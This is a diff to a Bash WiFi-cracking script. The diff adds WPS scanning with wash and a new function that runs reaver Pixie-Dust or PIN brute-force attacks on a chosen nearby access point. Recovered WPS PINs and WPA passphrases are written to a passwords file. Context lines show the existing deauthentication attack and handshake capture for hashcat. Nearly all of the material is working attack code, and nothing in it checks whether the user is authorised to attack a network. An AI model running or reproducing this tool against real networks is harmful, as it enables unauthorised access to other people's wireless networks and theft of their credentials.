@@ -79,7 +79,7 @@ sudo chown -R $UN:$UN $targets_path
 # Dependencies Installation
 # ------------------------------
 function install_dependencies() {
-    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "hcxtools" "mdk4" "gawk" "dbus-x11")
+    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "hcxtools" "mdk4" "gawk" "dbus-x11" "reaver" "jq" "pixiewps") # Ensure reaver, jq, and pixiewps are here
     for package in "${packages[@]}"; do
         if ! dpkg -l | grep -q "^ii  $package "; then
             echo -e "\nUpdating the repositories.."
@@ -188,18 +188,31 @@ function spoof_adapter_mac() {
 # Network Scanner
 # ------------------------------
 function network_scanner() {	
-        # Scan 15 seconds for wifi networks   
-        countdown_duration=5
-        sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
+    # Default airodump scan duration
+    countdown_duration=5 
+    # Check if wash and jq are installed and adjust countdown_duration if not, to give user time to see warning messages
+    if ! command -v wash &>/dev/null || ! command -v jq &>/dev/null; then
+        countdown_duration=8 # Longer if tools are missing
+    fi
 
-        echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
-        for (( i=$countdown_duration; i>=1; i-- )); do
-            tput cuu1 && tput el
-            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
-            sleep 1
-        done
-        mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
-        cp "$scan_input" "$scan_input.original"
+    # Start airodump-ng scan
+    sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
+
+    echo -e "\n\n\e[1;34mScanning available WiFi Networks with airodump-ng ($countdown_duration s):\e[0m"
+    for (( i=$countdown_duration; i>=1; i-- )); do
+        tput cuu1 && tput el # Move cursor up one line and clear it
+        echo -e "\e[1;34mScanning for available WiFi Networks (airodump-ng):\033[1;31m\033[1m $i \033[0m"
+        sleep 1
+    done
+
+    # Check if airodump-ng produced an output file
+    if [ ! -f "$targets_path/Scan/Scan-$current_date-01.csv" ]; then
+        echo -e "\n\e[1;31mError: airodump-ng scan file was not created. Check adapter status or permissions.\e[0m"
+        another_scan_prompt # Assuming this function handles prompting for new scan or exit
+        return
+    fi
+    mv "$targets_path/Scan/Scan-$current_date-01.csv" "$scan_input"
+    cp "$scan_input" "$scan_input.original"
         
 	# Extract client MAC and associated BSSID from the original scan without displaying them
 	clients_content=$(awk -F, '/Station MAC/ {flag=1; next} flag && $1 ~ /:/ {client_mac=$1; bssid=$6; if (bssid !~ /(not associated)/) printf "%-22s %s\n", client_mac, bssid}' "$scan_input.original")
@@ -215,19 +228,73 @@ function network_scanner() {
 	# Append the client information to the end of the scan file
 	echo -e "\nStation MAC:            BSSID:\n$clients_content" >> "$scan_input"
 
+    # WPS Scan with wash
+    echo -e "\n\e[1;34mScanning for WPS-enabled networks with wash (20s)...\e[0m"
+    local wash_json_output="$targets_path/Scan/wash_output.json"
+    if command -v wash &>/dev/null; then
+        # Using -C for ignore FCS, as per original instruction. Man page for reaver's wash might show -F.
+        # If issues, this flag might need checking against `wash --help`.
+        sudo timeout 20s wash -i "${wifi_adapter}mon" -j -C > "$wash_json_output" 2>/dev/null
+        if [ ! -s "$wash_json_output" ]; then # Check if file is empty (no WPS APs found) or not created (wash error)
+            echo -e "\e[1;33mWash scan completed. No WPS networks found or wash produced no output.\e[0m"
+            echo "[]" > "$wash_json_output" # Create an empty JSON array so jq doesn't fail
+        fi
+    else
+        echo -e "\e[1;31mWarning: 'wash' command not found. WPS detection will be skipped. Please install 'reaver'.\e[0m"
+        echo "[]" > "$wash_json_output" # Create an empty JSON array
+    fi
+
+    declare -A wps_info_map # Associative array to store WPS info by BSSID
+
+    if command -v jq &>/dev/null; then
+        if [ -f "$wash_json_output" ]; then
+            # Process each JSON object on a new line, select only objects with non-null and non-empty bssid
+            jq_processed_output=$(jq -c '.[] | select(.bssid != null and .bssid != "")' "$wash_json_output" 2>/dev/null)
+            while IFS= read -r line; do
+                local bssid_wps=$(echo "$line" | jq -r '.bssid')
+                # Defensive check, though jq select should handle it
+                if [[ -z "$bssid_wps" || "$bssid_wps" == "null" ]]; then continue; fi
+
+                local wps_version_raw=$(echo "$line" | jq -r '.wps_version') # Keep raw value for "null" string check
+                local is_locked_bool=$(echo "$line" | jq -r '.is_locked') # This will be "true", "false", or "null" as a string from jq -r
+                
+                local wps_version_display="-"
+                if [[ "$wps_version_raw" != "null" && -n "$wps_version_raw" ]]; then # If not string "null" and not empty
+                    wps_version_display=$wps_version_raw
+                fi
+
+                local wps_locked_display="-" # Default for display
+                if [[ "$is_locked_bool" == "true" ]]; then
+                    wps_locked_display="Yes"
+                elif [[ "$is_locked_bool" == "false" ]]; then
+                    wps_locked_display="No"
+                fi # If "null" or other, it remains "-"
+                
+                wps_info_map["$bssid_wps"]="WPSVer:$wps_version_display,WPSLocked:$wps_locked_display"
+            done <<< "$jq_processed_output"
+        else
+             # This case should ideally not be reached if we create an empty wash_json_output above
+             echo -e "\e[1;31mError: Wash output file ($wash_json_output) not found, though it should have been created.\e[0m"
+        fi
+    else
+        echo -e "\e[1;31mWarning: 'jq' command not found. WPS info parsing will be skipped. Please install 'jq'.\e[0m"
+    fi
+
 	# Display available WiFi networks
-	echo -e "\n\033[1;33mAvailable WiFi Networks:\033[0m\n"
+	echo -e "\n\033[1;33mAvailable WiFi Networks (from airodump-ng):\033[0m\n"
 
 	# Display the scan input file contents with row numbers
-	printf "\033[1m      Name: %-30s Clients: %-1s Encryption: %-3s Channel: %-1s Power: %-1s Signal: %-0s BSSID: %-13s Vendor: %-1s\033[0m\n"
-	echo "--------------------------------------------------------------------------------------------------------------------------------------------------"
+    # Header: Name width 25, Clients (dynamic), Encryption 10, WPS 3, Lck 3, Ch 2, Pwr 3, Signal (dynamic), BSSID 17, Vendor (dynamic)
+	printf "\033[1m      Name: %-25s Clients: %-1s Encryption: %-10s WPS: %-3s Lck: %-3s Ch: %-2s Pwr: %-3s Signal: %-0s BSSID: %-17s Vendor: %-1s\033[0m\n"
+	echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------"
 
-	declare -A client_counts
-	while IFS= read -r client_line; do
+
+	declare -A client_counts # Populated from clients_content earlier in the script
+	# This loop populates client_counts. It's correctly placed.
+	while IFS= read -r client_line; do 
 	    bssid=$(echo "$client_line" | awk '{print $2}')
-	    # Ensure bssid is not empty before incrementing
-	    if [[ -n "$bssid" ]]; then
-		((client_counts["$bssid"]++))
+	    if [[ -n "$bssid" ]]; then # Ensure bssid is not empty
+		    ((client_counts["$bssid"]++))
 	    fi
 	done <<< "$clients_content"
 
@@ -238,67 +305,70 @@ function network_scanner() {
 		continue
 	    fi
 	    index=$(echo "$line" | cut -d',' -f1 | xargs)
-	    mac=$(echo "$line" | cut -d',' -f2 | xargs)
+	    mac=$(echo "$line" | cut -d',' -f2 | xargs) # This is the BSSID from airodump scan
 	    channel=$(echo "$line" | cut -d',' -f3 | xargs)
 	    encryption=$(echo "$line" | cut -d',' -f4 | xargs)
 	    power=$(echo "$line" | cut -d',' -f5 | xargs)
 	    ssid=$(echo "$line" | cut -d',' -f6 | tr -d '|')  # remove "|" from SSID name
 
-	    # Get the vendor dynamically
 	    vendor=$(get_oui_vendor "$mac")
-	    # Get the number of clients for this BSSID
-	    client_count=${client_counts["$mac"]}
+	    client_count=${client_counts["$mac"]} # Get count for current BSSID
 	    clients_display=""
 	    if [[ -n "$client_count" ]]; then
 		clients_display="+$client_count"
 	    fi
 	      
-	    # Convert dBm power values into signal bars representation
-	    signal_strength=$power  # Assuming power is in dBm (negative values)
-    	    if (( signal_strength >= -60 )); then
-	        bars="\e[1;32m▂▄▆█\e[0m"  # Excellent
+	    signal_strength=$power
+    	if (( signal_strength >= -60 )); then
+	        bars="\e[1;32m▂▄▆█\e[0m"
 	    elif (( signal_strength >= -70 )); then
-	        bars="\e[1;33m▂▄▆_\e[0m"  # Good 
+	        bars="\e[1;33m▂▄▆_\e[0m"
 	    elif (( signal_strength >= -80 )); then
-	        bars="\e[1;35m▂▄__\e[0m"  # Fair
+	        bars="\e[1;35m▂▄__\e[0m"
 	    elif (( signal_strength >= -90 )); then
-	        bars="\e[1;36m▂___\e[0m"  # Weak 
+	        bars="\e[1;36m▂___\e[0m"
 	    else
-	        bars="\e[1;31m____\e[0m"  # Very Weak 
+	        bars="\e[1;31m____\e[0m"
 	    fi
 
-
-	    # Colorize encryption type using if-elif, replacing with colorized label
 	    temp_encryption=$encryption
-
 	    if [[ "$temp_encryption" == "WPA3" ]]; then
-	        encryption_color="\e[1;31mWPA3\e[0m"  # Red
+	        encryption_color="\e[1;31mWPA3\e[0m"
 	    elif [[ "$temp_encryption" == "WPA3 WPA2" || "$temp_encryption" == "WPA2 WPA3" ]]; then
-	        encryption_color="\e[91mWPA3 WPA2\e[0m"  # Red
+	        encryption_color="\e[91mWPA3 WPA2\e[0m"
 	    elif [[ "$temp_encryption" == "WPA2" ]]; then
-	        encryption_color="\e[93mWPA2\e[0m"  # Orange
+	        encryption_color="\e[93mWPA2\e[0m"
 	    elif [[ "$temp_encryption" == "WPA2 WPA" || "$temp_encryption" == "WPA WPA2" ]]; then
-	        encryption_color="\e[96mWPA2 WPA\e[0m"  # Cyan
+	        encryption_color="\e[96mWPA2 WPA\e[0m"
 	    elif [[ "$temp_encryption" == "OPN" || "$temp_encryption" == "Open" ]]; then
-	        encryption_color="\e[92mOPEN\e[0m"  # Green
+	        encryption_color="\e[92mOPEN\e[0m"
 	    else
-	        encryption_color="$temp_encryption"  # Default color
+	        encryption_color="$temp_encryption"
 	    fi
 
+        retrieved_wps_info=${wps_info_map["$mac"]} 
+        local wps_display_ver="-"
+        local wps_display_lck="-"
+        if [[ -n "$retrieved_wps_info" ]]; then
+            # Using \1 for sed capture group
+            wps_display_ver=$(echo "$retrieved_wps_info" | sed -n 's/.*WPSVer:\([^,]*\).*/\1/p')
+            if [[ -z "$wps_display_ver" ]]; then wps_display_ver="-"; fi # Default to "-" if sed extraction fails
+            wps_display_lck=$(echo "$retrieved_wps_info" | sed -n 's/.*WPSLocked:\(.*\)/\1/p')
+            if [[ -z "$wps_display_lck" ]]; then wps_display_lck="-"; fi # Default to "-" if sed extraction fails
+        fi
+        
+        local vendor_display="${vendor:--}" # Display '-' if vendor is empty
 
 
 	    # Use printf to format the fields and pipe into column for proper alignment
-	    if [[ -n "$vendor" ]]; then
-		printf "%-4s %-35s | %-7s | %-21b | %-7s | %-5s | %-5b | %-17s | %-1s\n" \
-		    "$index." "$ssid" "$clients_display" "$encryption_color" "$channel" "$power" "$bars" "$mac" "$vendor"
-	    else
-		printf "%-4s %-35s | %-7s | %-21b | %-7s | %-5s | %-5b | %-17s\n" \
-		    "$index." "$ssid" "$clients_display" "$encryption_color" "$channel" "$power" "$bars" "$mac"
-	    fi
+        # Data row: Name 25, Clients dynamic, Encryption (colored) ~18-20, WPS 3, Lck 3, Ch 2, Pwr 5, Signal (colored) ~5, BSSID 17, Vendor dynamic
+		printf "%-4s %-25s | %-7s | %-18b | %-3s | %-3s | %-2s | %-5s | %-5b | %-17s | %-1s\n" \
+		    "$index." "$ssid" "$clients_display" "$encryption_color" "$wps_display_ver" "$wps_display_lck" "$channel" "$power" "$bars" "$mac" "$vendor_display"
+
 	done | column -t -s "|"
 	echo
         
-        num_rows=$(awk '/Station MAC/ {exit} NF {count++} END {print count}' "$scan_input") # Calculate the number of valid rows (above the empty line before "Station MAC")
+        num_rows=$(awk '/Station MAC/ {exit} NF {count++} END {print count}' "$scan_input") 
 		    	    
         choose_network
 }
@@ -357,9 +427,51 @@ function choose_network() {
             echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
         fi
         echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
-        echo -e "\033[1;31m\033[1mPower:\033[0m $power"        
-        echo
-        echo
+        echo -e "\033[1;31m\033[1mPower:\033[0m $power"
+        
+        # Fetch and display WPS details
+        local wps_version="N/A"
+        local wps_locked="N/A" # Use text "N/A", "Yes", "No"
+        local wps_available=false
+
+        if [ -f "$targets_path/Scan/wash_output.json" ] && command -v jq &>/dev/null; then
+            local wps_ap_json=$(jq -r --arg BSSID "$bssid_address" '.[] | select(.bssid == $BSSID)' "$targets_path/Scan/wash_output.json")
+            if [[ -n "$wps_ap_json" ]]; then
+                local raw_wps_ver=$(echo "$wps_ap_json" | jq -r '.wps_version')
+                local raw_is_locked=$(echo "$wps_ap_json" | jq -r '.is_locked')
+
+                if [[ "$raw_wps_ver" != "null" && -n "$raw_wps_ver" ]]; then
+                    wps_version="$raw_wps_ver"
+                    wps_available=true # Considered available if version is reported
+                fi
+
+                if [[ "$raw_is_locked" == "true" ]]; then
+                    wps_locked="Yes"
+                elif [[ "$raw_is_locked" == "false" ]]; then
+                    wps_locked="No"
+                fi
+            fi
+        fi
+        
+        echo -e "\033[1;31m\033[1mWPS Version:\033[0m $wps_version"
+        echo -e "\033[1;31m\033[1mWPS Locked:\033[0m $wps_locked"
+        echo # Blank line for spacing
+
+        if [[ "$wps_available" == true ]]; then
+            read -p "WPS is available for this network. Try WPS attack? (Y/n): " wps_choice
+            case "$wps_choice" in
+                [Yy]*)
+                    wps_attack 
+                    # After WPS attack attempt, go back to network selection or main menu
+                    echo -e "\nReturning to network selection..."
+                    continue # Restarts the choose_network loop
+                    ;;
+                *)
+                    echo -e "Skipping WPS attack."
+                    ;;
+            esac
+        fi
+        echo # Blank line for spacing if WPS prompt happened
 
         if [ "$encryption" = "OPN" ]; then
             echo -e "\033[1mThe Network is open.\033[0m"
@@ -1051,15 +1163,145 @@ function main_process() {
 	deauth_attack
 	cleanup
 	
-	hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
-	if [ ! -f "$targets_path/$bssid_name/hash.hc22000" ]; then
-	    echo '❌ Failed to create hash.hc22000 for hashcat.';
-	    echo 'Check if you captured the EAPOL handshake or PMKID.';
-	    echo -e 'Look at the airodump_output.txt file for details. \nExiting.\n\n';
+    local hcx_log_file="$targets_path/$bssid_name/hcx_convert.log"
+    echo -e "\n[*] Converting capture file to Hashcat format using hcxpcapngtool..."
+    if sudo hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > "$hcx_log_file" 2>&1; then
+        if grep -q -i "PMKID" "$hcx_log_file"; then
+            echo -e "    \e[1;32mINFO: PMKID identified in capture.\e[0m"
+        elif grep -q -i "EAPOL" "$hcx_log_file"; then
+            echo -e "    \e[1;32mINFO: EAPOL data identified in capture.\e[0m"
+        fi
+    else
+        echo -e "    \e[1;31mERROR: hcxpcapngtool command failed. See $hcx_log_file for details.\e[0m"
+    fi
+
+	if [ ! -s "$targets_path/$bssid_name/hash.hc22000" ]; then # Check for non-empty file
+	    echo '❌ Failed to create hash.hc22000 for hashcat or hash file is empty.'
+	    echo 'Check if you captured the EAPOL handshake or PMKID.'
+	    echo -e 'Look at the airodump_output.txt file for details.'
+        echo "   Check $hcx_log_file for conversion details."
+        echo -e 'Exiting.\n\n'
 	    exit 1	       
 	fi	
 	
 	choose_attack
+}
+
+# ------------------------------
+# WPS Attack
+# ------------------------------
+function wps_attack() {
+    echo -e "\n\e[1;34mSelected for WPS Attack: $bssid_name_original ($bssid_address)\e[0m"
+    local reaver_output_file="$targets_path/$bssid_name/reaver_output.txt"
+    
+    # Ensure the target directory exists
+    mkdir -p "$targets_path/$bssid_name"
+
+    echo -e "\nChoose WPS attack type:"
+    echo "1. Pixie-Dust attack (reaver -K, faster, for some vulnerable APs)"
+    echo "2. Standard PIN brute-force (reaver, can be very slow)"
+    read -p "Enter choice (1 or 2): " wps_attack_choice
+
+    local base_reaver_cmd="sudo reaver -i \"${wifi_adapter}mon\" -b \"$bssid_address\" -c \"$channel\" -e \"$bssid_name_original\" -vvS"
+    local reaver_cmd=""
+
+    case "$wps_attack_choice" in
+        1)
+            if ! command -v pixiewps &>/dev/null; then
+                echo -e "\n\e[1;31mWarning: 'pixiewps' command not found. Pixie-Dust attack requires it.\e[0m"
+                read -p "Attempt Pixie-Dust anyway (reaver -K might still work if reaver has it built-in) or switch to Standard Brute-Force? (A/s): " pixiewps_fallback_choice
+                if [[ "$pixiewps_fallback_choice" =~ ^[Ss]$ ]]; then
+                    echo "Switching to Standard PIN brute-force."
+                    reaver_cmd="$base_reaver_cmd"
+                else
+                    echo "Attempting Pixie-Dust attack with reaver -K."
+                    reaver_cmd="$base_reaver_cmd -K" # -K is often equivalent to -Z or uses pixiewps internally if available
+                fi
+            else
+                 echo "Attempting Pixie-Dust attack (reaver -K)."
+                 reaver_cmd="$base_reaver_cmd -K"
+            fi
+            ;;
+        2)
+            echo "Selected Standard PIN brute-force."
+            reaver_cmd="$base_reaver_cmd"
+            # Consider adding --dh-small if not covered by -S, or delays like -d 0. -S usually implies small DH keys.
+            # Example: reaver_cmd="$base_reaver_cmd --dh-small -d 0"
+            ;;
+        *)
+            echo -e "\e[1;31mInvalid choice. Aborting WPS attack.\e[0m"
+            return
+            ;;
+    esac
+
+    echo -e "\nStarting Reaver. This may take a very long time, especially for standard brute-force."
+    echo "Monitor the new terminal window for Reaver's progress."
+    echo "Reaver command to be executed: $reaver_cmd"
+    
+    # Using script command to better capture all output, including real-time updates from reaver
+    # The --wait on gnome-terminal is important.
+    gnome-terminal --wait --geometry=90x25 --title="Reaver Attack on $bssid_name_original" -- bash -c "script -q -c '$reaver_cmd' '$reaver_output_file'; echo 'Reaver finished. Terminal will close in 10s...'; sleep 10"
+     
+    echo "Reaver process completed. Checking output..."
+
+    local found_pin=""
+    local found_psk=""
+
+    if [ -s "$reaver_output_file" ]; then # Check if file exists and is not empty
+        # Try to capture the last reported PIN and PSK to handle cases where reaver might find a PIN then later a PSK
+        found_pin=$(grep 'WPS PIN:' "$reaver_output_file" | tail -n 1 | awk -F': ' '{print $2}' | tr -d "[:space:]")
+        found_psk=$(grep 'WPA PSK:' "$reaver_output_file" | tail -n 1 | awk -F': ' '{print $2}' | tr -d "[:space:]'")
+        
+        if [ -z "$found_psk" ]; then
+             # Some reaver versions might just use PSK:
+            found_psk=$(grep -E '(PSK:|WPA PSK:)' "$reaver_output_file" | tail -n1 | awk -F': ' '{print $2}' | tr -d "[:space:]")
+        fi
+         # Clean up potential surrounding quotes from PSK if any
+        found_psk=$(echo "$found_psk" | sed -e 's/^"//' -e 's/"$//' -e "s/^'//" -e "s/'$//")
+
+    else
+        echo -e "\e[1;31mReaver output file ($reaver_output_file) not found or is empty.\e[0m"
+    fi
+
+    if [[ -n "$found_psk" ]]; then
+        echo -e "\n\e[1;32mSUCCESS! WPA PSK Found!\e[0m"
+        echo -e "\e[1;34mESSID:\e[0m $bssid_name_original"
+        if [[ -n "$found_pin" ]]; then # Display PIN only if also found
+             echo -e "\e[1;34mWPS PIN:\e[0m \e[1;33m$found_pin\e[0m"
+        fi
+        echo -e "\e[1;34mWPA PSK:\e[0m \e[1;33m$found_psk\e[0m"
+        
+        echo "---" >> "$targets_path/wifi_passwords.txt"
+        printf "WPS Attack Success for (%s): %-30s at %s\n" "$bssid_address" "$bssid_name_original" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
+        if [[ -n "$found_pin" ]]; then
+            printf "WPS PIN: %s\n" "$found_pin" >> "$targets_path/wifi_passwords.txt"
+        fi
+        printf "WPA PSK: %s\n" "$found_psk" >> "$targets_path/wifi_passwords.txt"
+        
+        rm -rf "$targets_path/$bssid_name" # Clean up specific target folder
+        cleanup 
+        exit 0
+    elif [[ -n "$found_pin" ]]; then
+        echo -e "\n\e[1;32mWPS PIN Found, but WPA PSK was not recovered by Reaver.\e[0m"
+        echo -e "\e[1;34mESSID:\e[0m $bssid_name_original"
+        echo -e "\e[1;34mWPS PIN:\e[0m \e[1;33m$found_pin\e[0m"
+        
+        echo "---" >> "$targets_path/wifi_passwords.txt"
+        printf "WPS PIN Found (PSK not recovered) for (%s): %-30s at %s\n" "$bssid_address" "$bssid_name_original" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
+        printf "WPS PIN: %s\n" "$found_pin" >> "$targets_path/wifi_passwords.txt"
+        
+        echo "You can try running Reaver again with the known PIN using '-p $found_pin' to get the PSK, or use other tools."
+        # Do not exit here, let it fall through to another_scan_prompt or simply return to choose_network's loop
+    else
+        echo -e "\n\e[1;31mWPS attack failed. No PIN or PSK recovered.\e[0m"
+        echo "Check '$reaver_output_file' for details."
+        echo "---" >> "$targets_path/wifi_passwords.txt"
+        printf "WPS Attack Failed for (%s): %-30s at %s\n" "$bssid_address" "$bssid_name_original" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
+        # Do not exit here, let it fall through to another_scan_prompt or simply return to choose_network's loop
+    fi
+    # If not exited due to PSK success, returning to choose_network loop (via the continue in choose_network)
+    # or if called from elsewhere, it will just return.
+    # another_scan_prompt # Removed as per refined logic flow, control returns to choose_network
 }
 
 install_dependencies
